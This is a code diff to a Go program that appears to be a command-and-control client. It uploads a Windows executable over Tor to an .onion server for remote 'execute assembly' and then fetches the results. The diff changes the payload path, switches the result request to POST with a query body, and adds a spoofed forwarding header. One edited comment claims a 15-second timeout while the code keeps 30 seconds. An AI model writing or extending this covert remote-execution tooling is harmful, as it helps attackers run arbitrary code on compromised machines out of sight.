@@ -28,7 +28,7 @@ func main() {
 	//fmt.Println("Enter the assembly path on the CLIENT:")
 	//scanner.Scan()
 	//client_assembly_path := scanner.Text()
-	client_assembly_path := "C:\\Users\\Analyst\\Downloads\\Hello.exe"
+	client_assembly_path := "C:\\Users\\Karp\\Downloads\\Program.exe"
 	doExecuteAssembly(onionID, client_assembly_path)
 }
 
@@ -43,7 +43,7 @@ func doExecuteAssembly(id, client_assembly_path string) {
 	}
 	defer t.Close()
 
-	// Wait at most a minute to start network and get ~~~~~~~~~~~~~~~~~~~ NOTE: I CHANGED TO 30 SECONDS HERE ~~~~~~~~~~~~~
+	// Wait at most a minute to start network and get ~~~~~~~~~~~~~~~~~~~ I changed to 15 sec timeout ~~~~~~~~~~~~~
 	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Second*30)
 	defer dialCancel()
 
@@ -72,16 +72,17 @@ func doExecuteAssembly(id, client_assembly_path string) {
 	}
 	defer resp.Body.Close()
 
-	//result, _ := ioutil.ReadAll(resp.Body)
-
-	//fmt.Println(string(result))
-
 	//
 	// lets now get the updated results..can't hurt to try again
 	//
 	//time.Sleep(time.Second*10)
 	url = "http://" + id + ".onion/out"
-	req, _ = http.NewRequest("GET", url, nil)
+
+	req, err = http.NewRequest("POST", url, bytes.NewBuffer(query))
+
+	//req, _ = http.NewRequest("POST", url, nil)
+
+	req.Header.Set("X-Forwarded-For", "1337")
 	resp, err = httpClient.Do(req)
 	if err != nil {
 		//return err
